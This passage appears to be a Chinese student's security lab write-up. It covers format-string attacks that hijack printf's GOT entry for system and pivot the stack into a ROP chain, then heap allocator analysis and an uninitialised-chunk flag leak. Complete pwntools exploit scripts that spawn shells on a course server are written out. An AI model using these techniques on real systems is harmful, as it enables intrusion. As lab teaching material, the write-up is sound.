class="line">p.recvuntil(<span class="string">b"address of x is: "</span>)</span><br><span class="line">addr_to_modify = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>).decode())</span><br><span class="line"></span><br><span class="line">offset_of_input = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"%{}c%{}$hn"</span>.<span class="built_in">format</span>(<span class="number">1</span>, offset_of_input + <span class="number">1</span>)</span><br><span class="line">payload = payload.encode().ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">payload += p64(addr_to_modify)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>本地获取shell：</p>
+<p><img src="/2025/06/26/Ssec/image-20241023204515574.png"></p>
+<p>远程获取shell，运行flag.exe</p>
+<p><img src="/2025/06/26/Ssec/image-20241023231852426.png"></p>
+<h2 id="task-2-1">Task 2</h2>
+<p>checksec一下程序，没开PIE，Partial Relro表示Got表在没有全部解析之前是可写的。</p>
+<p><img src="/2025/06/26/Ssec/image-20241023210800054.png"></p>
+<p>看下程序，无限次的格式化字符串漏洞。</p>
+<p><img src="/2025/06/26/Ssec/image-20241023210847678.png"></p>
+<p>本题思路：</p>
+<ul>
+<li>先利用一次漏洞泄露<code>printf</code>的<code>GOT</code>表中的地址（<code>printf</code>函数的真实地址），算出<code>libc</code>加载的基地址，从而算出system函数的真实地址。</li>
+<li>再利用一次漏洞，将<code>printf</code>的<code>GOT</code>表劫持为<code>system</code>函数的真实地址，这样在再次执行<code>printf(s)</code>的时候，实际上执行的就是<code>system(s)</code></li>
+<li>输入<code>/bin/sh</code>, 执行<code>system("/bin/sh")</code>, 拿到<code>shell</code></li>
+</ul>
+<p>本题exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_str_payload</span>(<span class="params">base_offset, max_length, addr, value</span>):</span><br><span class="line">    payload = <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>(value % <span class="number">0x100</span>, base_offset + <span class="number">0x40</span>//<span class="number">0x8</span>)</span><br><span class="line">    payload += <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>((value &gt;&gt; <span class="number">8</span>) % <span class="number">0x100</span> + (<span class="number">0x100</span> - (value % <span class="number">0x100</span>)), base_offset + <span class="number">0x40</span>//<span class="number">0x8</span> + <span class="number">1</span>)</span><br><span class="line">    payload += <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>((value &gt;&gt; <span class="number">16</span>) % <span class="number">0x100</span> + (<span class="number">0x100</span> - (value &gt;&gt; <span class="number">8</span>) % <span class="number">0x100</span>), base_offset + <span class="number">0x40</span>//<span class="number">0x8</span> + <span class="number">2</span>)</span><br><span class="line">    payload += <span class="string">"%{}c%{}$hhn"</span>.<span class="built_in">format</span>((value &gt;&gt; <span class="number">24</span>) % <span class="number">0x100</span> + (<span class="number">0x100</span> - (value &gt;&gt; <span class="number">16</span>) % <span class="number">0x100</span>), base_offset + <span class="number">0x40</span>//<span class="number">0x8</span> + <span class="number">3</span>)</span><br><span class="line">    payload = payload.encode().ljust(<span class="number">0x40</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(addr + <span class="number">1</span>)</span><br><span class="line">    payload += p64(addr + <span class="number">2</span>)</span><br><span class="line">    payload += p64(addr + <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; max_length:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Size Overflow!"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"8.154.20.109"</span>, <span class="number">10301</span>)</span><br><span class="line"><span class="comment"># p = process("./fsb2")</span></span><br><span class="line">ID_validation()</span><br><span class="line">elf = ELF(<span class="string">"./fsb2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"%7$s"</span></span><br><span class="line">payload = payload.encode().ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">"printf"</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"Here comes your challenge:\n"</span>) <span class="comment"># 本地这句话去掉</span></span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">"printf"</span>]</span><br><span class="line">log.success(<span class="string">f"libc base addr =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">payload = fmt_str_payload(offset, <span class="number">0x100</span>, elf.got[<span class="string">"printf"</span>], system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>因为六个字节的数字传输过去实在太大，由于传输的时间有限，一次写不了这么大的数据，所以本人利用逐字节写入的方法拆分数据为依次四个地址+四个字节。（因为按道理来讲，printf和system的地址差不可能超过0x100000000大小，libc加载的size都没这么大，所以稍微偷个懒，就改低四字节就行~）</p>
+<p>还有一点是，一旦写入就会破坏<code>printf</code>的<code>GOT</code>，<code>printf</code>便无法再使用，所以四个字节必须一次性写完~</p>
+</blockquote>
+<p>本地测试，获取shell：</p>
+<p><img src="/2025/06/26/Ssec/image-20241023211659082.png"></p>
+<p>远程测试，运行flag.exe程序</p>
+<p><img src="/2025/06/26/Ssec/image-20241023212316766.png"></p>
+<h2 id="bonus">Bonus</h2>
+<p>两次fmt漏洞，由于是非栈上的fmt，所以我们可以利用栈上的一些栈指针，也就是栈上的指针链子，间接修改返回地址</p>
+<blockquote>
+<p>在面向以<code>push rbp; mov rbp, rsp</code>为基础，创建函数栈的程序中，栈上会有一些很长很长的栈指针链</p>
+<p>比如 A -&gt; B -&gt; C</p>
+<p>此时假如我们知道A在栈上的偏移，就可以利用A去修改B，让B指向D</p>
+<p>修改之后 A -&gt; B -&gt; D</p>
+<p>这个时候我们就可以算出B在栈上的偏移，用B去修改D，完成任意地址读写</p>
+</blockquote>
+<p>首先动态调试观察函数栈</p>
+<p><img src="/2025/06/26/Ssec/image-20241023213434684.png"></p>
+<p>好板子的指针链，所以我们只需要先修改<code>dc00</code>指向的内容为<code>dbe0</code>, 再修改<code>dbe0</code>指向的内容为<code>buffer</code>里面的一段数据。</p>
+<p>看到有两层函数栈，也就有两组<code>leave|ret</code>！非栈上fmt最后的大多都是把栈搞到buffer里面栈迁移！</p>
+<blockquote>
+<p>当然上面的栈指针都是假的，是本地gdb调试时候示意用的，真正运行的时候会随机化。</p>
+<p>但是各个栈指针互相的偏移是不会变的，我们第一次可以先泄露一个栈指针，然后根据偏移算出其他的。</p>
+</blockquote>
+<p>本题的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"8.154.20.109"</span>, <span class="number">10302</span>)</span><br><span class="line"><span class="comment"># p = process("./bonus")</span></span><br><span class="line">elf = ELF(<span class="string">"./bonus"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line">ID_validation()</span><br><span class="line"></span><br><span class="line">offset_A = <span class="number">8</span></span><br><span class="line">offset_B = offset_A + (<span class="number">0x30</span> - <span class="number">0x10</span>) // <span class="number">8</span></span><br><span class="line">vuln_skip_push_rsp = <span class="number">0x40126E</span></span><br><span class="line">buffer = <span class="number">0x4050A0</span></span><br><span class="line">pop_rdi = <span class="number">0x4011de</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"%{}$p"</span>.<span class="built_in">format</span>(offset_A)</span><br><span class="line">payload = payload.encode().ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b"Here comes your challenge:\n"</span>)</span><br><span class="line">stack_ptr_to_ret_addr = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>).decode()) - <span class="number">0x20</span></span><br><span class="line">stack_ptr_to_A = stack_ptr_to_ret_addr - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%c"</span> * <span class="number">6</span></span><br><span class="line">payload += <span class="string">"%{}c%hn"</span>.<span class="built_in">format</span>(stack_ptr_to_ret_addr % <span class="number">0x10000</span> - <span class="number">6</span>)</span><br><span class="line"><span class="comment"># 覆盖上面修改中输出的字节。</span></span><br><span class="line">payload += <span class="string">"%{}c%{}$lln"</span>.<span class="built_in">format</span>(buffer + <span class="number">0x40</span> - stack_ptr_to_ret_addr % <span class="number">0x10000</span>, offset_B)</span><br><span class="line">payload = payload.encode().ljust(<span class="number">0x40</span>, <span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(buffer + <span class="number">0x90</span>)</span><br><span class="line">payload += p64(vuln_skip_push_rsp)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">payload += <span class="string">b"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">p.info(<span class="string">"payload length: {}"</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>比较有意思的地方：</p>
+<blockquote>
+<p>当printf在解析收到的字符串时，当遇到了第一个位置解析的格式化字符时比如<code>%7$p</code>, <code>%8$s</code> 这种带数字的的，后面所有带位置制定的格式化字符都会被一并解析出来。</p>
+<p>也就是说，当我们最后的payload这么写的时候，<code>stack_ptr_A</code> 和 <code>stack_ptr_B</code> 都是位置指定的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;payload = <span class="string">"%{}c%{}$hn"</span>.<span class="built_in">format</span>(stack_ptr_to_ret_addr % <span class="number">0x10000</span> - <span class="number">6</span>, offset_A)</span><br><span class="line">&gt;payload += <span class="string">"%{}c%{}$lln"</span>.<span class="built_in">format</span>(buffer + <span class="number">0x40</span> - stack_ptr_to_ret_addr % <span class="number">0x10000</span>, offset_B)</span><br><span class="line">&gt;payload = payload.encode().ljust(<span class="number">0x40</span>, <span class="string">b"\x00"</span>)</span><br></pre></td></tr></table></figure>
+<p>当printf在解析字符串时，遇到第一个位置指定格式化字符串的时候（<code>stack_ptr_A</code> ）<code>stack_ptr_B</code>也会被一并解析出来，所以当printf执行完第一行的时候，已经把 A - &gt; B改成 A -&gt; C了，但是在后面处理第二行的时候，printf不会再去栈里解析一遍，他还会拿B进行操作。</p>
+<p>所以我们必须让第一行不用位置指定：在前面加6个<code>%c</code>, 让printf自己查数查到<code>offset_a</code>的位置，改掉<code>offset_b</code>处的数据，这样printf在处理第二行的时候，解析出来的就是经过修改之后的数据了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;payload = <span class="string">"%c"</span> * <span class="number">6</span></span><br><span class="line">&gt;payload += <span class="string">"%{}c%hn"</span>.<span class="built_in">format</span>(stack_ptr_to_ret_addr % <span class="number">0x10000</span> - <span class="number">6</span>)</span><br><span class="line">&gt;payload += <span class="string">"%{}c%{}$lln"</span>.<span class="built_in">format</span>(buffer + <span class="number">0x40</span> - stack_ptr_to_ret_addr % <span class="number">0x10000</span>, offset_B)</span><br><span class="line">&gt;payload = payload.encode().ljust(<span class="number">0x40</span>, <span class="string">b"\x00"</span>)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>本地测试，获取shell</p>
+<p><img src="/2025/06/26/Ssec/image-20241023231358991.png"></p>
+<p>远程测试，执行<code>flag.exe</code>程序：</p>
+<p><img src="/2025/06/26/Ssec/image-20241023231439927.png"></p>
+<p>比较庆幸的是这个题没有卡交互时间，因为输出了太多字符了。如果限制了的话这种打法还是做不了.....</p>
+<h1 id="ssec-2024-lab03-实验报告">Ssec-2024 Lab03 实验报告</h1>
+<h2 id="堆管理器基础">堆管理器基础</h2>
+<h3 id="task-1-2">Task 1</h3>
+<h4 id="example.c-程序分析">example.c 程序分析</h4>
+<p>Pre：程序通过 <code>__malloc_hook</code> 和 <code>__free_hook</code> 来替换默认的内存分配函数，在内存分配和释放时打印调试信息。</p>
+<p><strong><code>user_add</code> 函数：</strong></p>
+<ul>
+<li>该函数允许用户添加新用户，如果内存分配失败，程序会尝试处理内存不足的情况，输出错误信息。</li>
+<li>在 user_add中，程序分配内存时存在两个地方：
+<ul>
+<li>用户信息（<code>info</code>）的内存分配</li>
+<li>用户简介（<code>intro</code>）的内存分配</li>
+<li>其中如果 <code>intro</code> 分配失败，会跳到 <code>oom1</code> 标签，释放已分配的 <code>info</code> 内存，防止内存泄漏。</li>
+</ul></li>
+</ul>
+<p><strong><code>user_del</code> 函数：</strong></p>
+<ul>
+<li>该函数允许删除用户，首先通过索引查找用户，如果存在，则要求输入密码进行验证。</li>
+<li>如果密码正确，会释放该用户的信息并设置为 <code>NULL</code>。</li>
+</ul>
+<p><strong><code>user_show</code> 函数:</strong></p>
+<p>这个函数用于显示用户信息。它首先通过索引查找用户，然后验证用户输入的密码是否正确。如果密码正确，程序会显示用户的姓名、座右铭和简介。</p>
+<p><strong><code>user_edit</code> 函数:</strong></p>
+<p>这个函数允许用户修改自己的信息。用户需要输入密码进行验证，验证通过后，程序允许修改用户的姓名、简介和座右铭。</p>
+<h4 id="main-函数"><strong><code>main</code> 函数</strong></h4>
+<ul>
+<li><strong>功能：</strong> 该函数是程序的主控制循环，根据用户的输入调用不同的功能（如添加用户、删除用户、显示用户、编辑用户或执行堆转储操作）。</li>
+<li><strong>流程：</strong>
+<ol type="1">
+<li>调用 <code>prepare()</code> 函数进行初始化，设置输出缓冲区，加载内存钩子，设置定时器等。</li>
+<li>显示用户操作菜单，并读取用户输入的选项。</li>
+<li>根据选项执行不同的函数，处理用户的请求。</li>
+<li>当用户选择退出时，程序终止。</li>
+</ol></li>
+</ul>
+<p>同时程序提供了<code>heap_debug</code>函数用户dump出内存信息，辅助调试。</p>
+<p>通过<code>make build</code> 编译出<code>example</code>文件</p>
+<p><img src="/2025/06/26/Ssec/image-20241106183115944.png"></p>
+<p><code>ldd</code> 截图</p>
+<p><img src="/2025/06/26/Ssec/image-20241106183242837.png"></p>
+<h3 id="task-2-2">Task 2</h3>
+<p>写解析脚本把<code>.bin</code>文件解析为如实验指导中 所示的csv文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义文件路径和常量</span></span><br><span class="line">file_path = <span class="string">'./dump_d29000_0.bin'</span></span><br><span class="line">base_address = <span class="number">0xd29000</span></span><br><span class="line">interval = <span class="number">0x10</span>  </span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = f.read(interval)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; interval:</span><br><span class="line">                chunk += <span class="string">b'\x00'</span> * (interval - <span class="built_in">len</span>(chunk))</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            value1 = <span class="built_in">int</span>.from_bytes(chunk[:<span class="number">8</span>], <span class="string">'little'</span>)</span><br><span class="line">            value2 = <span class="built_in">int</span>.from_bytes(chunk[<span class="number">8</span>:], <span class="string">'little'</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value1 == <span class="number">0</span> <span class="keyword">and</span> value2 == <span class="number">0</span>:</span><br><span class="line">                addr = <span class="string">'...'</span></span><br><span class="line">                offset_hex = <span class="string">'...'</span></span><br><span class="line">                value1_hex = <span class="string">'...'</span></span><br><span class="line">                value2_hex = <span class="string">'...'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                addr = <span class="built_in">hex</span>(base_address + offset)</span><br><span class="line">                offset_hex = <span class="built_in">hex</span>(offset)</span><br><span class="line">                value1_hex = <span class="built_in">hex</span>(value1)</span><br><span class="line">                value2_hex = <span class="built_in">hex</span>(value2)</span><br><span class="line">            </span><br><span class="line">            data.append((addr, offset_hex, value1_hex, value2_hex))</span><br><span class="line">            </span><br><span class="line">            offset += interval</span><br><span class="line"></span><br><span class="line">    df_output = pd.DataFrame(data, columns=[<span class="string">'addr'</span>, <span class="string">'offset'</span>, <span class="string">'value1'</span>, <span class="string">'value2'</span>])</span><br><span class="line">    output_path = <span class="string">'./heap_memory_dump.csv'</span></span><br><span class="line">    df_output.to_csv(output_path, index=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"数据已保存到 <span class="subst">{output_path}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"读取文件时发生错误：<span class="subst">{e}</span>"</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>截取部分堆块做如实验指导所示的分析：</p>
+<p><img src="/2025/06/26/Ssec/image-20241107031013898.png"></p>
+<p>其中黄色区域标识<code>info</code>堆块，蓝色区域标识<code>intro</code>堆块，绿色区域标识和<code>tcache bin</code>有关的数据结构。</p>
+<h3 id="task-3-1">Task 3</h3>
+<p>已知tcache bin的一条链上最多能容纳7个free的堆块，如果再free两个堆块，那么这两个堆块的size落在了<code>fast bin</code>可以接受的范围内，会进入<code>fast bin</code>链表当中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handle_del(vincent_idx, <span class="string">b"m950524"</span>)</span><br><span class="line">handle_del(mark_idx, <span class="string">b"marknb11"</span>)</span><br><span class="line">handle_del(charles_idx, <span class="string">b"aaabbb"</span>)</span><br><span class="line">handle_del(jack_idx, <span class="string">b"p4ssw0rd"</span>)</span><br><span class="line">handle_del(jimmy_idx, <span class="string">b"abc321"</span>)</span><br><span class="line">handle_del(alice_idx, <span class="string">b"654321"</span>)</span><br><span class="line">handle_del(bob_idx, <span class="string">b"123456"</span>)</span><br><span class="line"><span class="comment"># ------</span></span><br><span class="line">handle_del(william_idx, <span class="string">b"will32123"</span>)</span><br><span class="line">handle_del(joseph_idx, <span class="string">b"jjj789"</span>)</span><br></pre></td></tr></table></figure>
+<p>解析生成的<code>.bin</code>文件，发现新free的堆块没有进入到<code>tcache</code>链表。</p>
+<p><img src="/2025/06/26/Ssec/image-20241203031816184.png"></p>
+<h2 id="堆上常见漏洞">堆上常见漏洞</h2>
+<h3 id="uninit">Uninit</h3>
+<p>观察程序源码，发现main函数里面先是获取<code>FLAG</code>的环境变量然后跟上前面的padding，存储在一个<code>0x40</code>大小的堆块中。</p>
+<p>之后把这个堆块给free掉。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> choice;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * allocate flag data here</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>* flag = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(flag, <span class="string">"the sacred and awesome flag is %s\n"</span>, getenv(<span class="string">"FLAG"</span>));</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    <span class="built_in">free</span>(flag);</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>
+<p>观察<code>user_add</code>函数，里面申请的<code>intro</code>大小也为<code>0x40</code>， 并且没有做初始化。</p>
+<p>在flag堆块进入free列表后，前十六个字节，也就是<code>fd</code>和<code>bk</code>的位置会被设置为指针，而后面的内容是没有被初始化的。</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">         fd          </span>|</span><br><span class="line">----------------------|<span class="string"></span></span><br><span class="line"><span class="string"></span>|<span class="string">         bk          </span>|</span><br><span class="line">----------------------|<span class="string"></span></span><br><span class="line"><span class="string"></span>|<span class="string"> padding[16:] + flag </span>|</span><br></pre></td></tr></table></figure>
+<p>所以再次申请这个堆块的时候，只要把前十六个字节覆盖掉，就能在<code>show</code>的时候把后面的<code>flag</code>给拉出来。</p>
+<p>本题的<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.binary = elf = ELF("./uninit")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(elf.path)</span></span><br><span class="line">p = remote(<span class="string">"8.154.20.109"</span>, <span class="number">10400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_add</span>(<span class="params">name: <span class="built_in">bytes</span>, password: <span class="built_in">bytes</span>, intro: <span class="built_in">bytes</span>, motto: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"name &gt; "</span>)</span><br><span class="line">   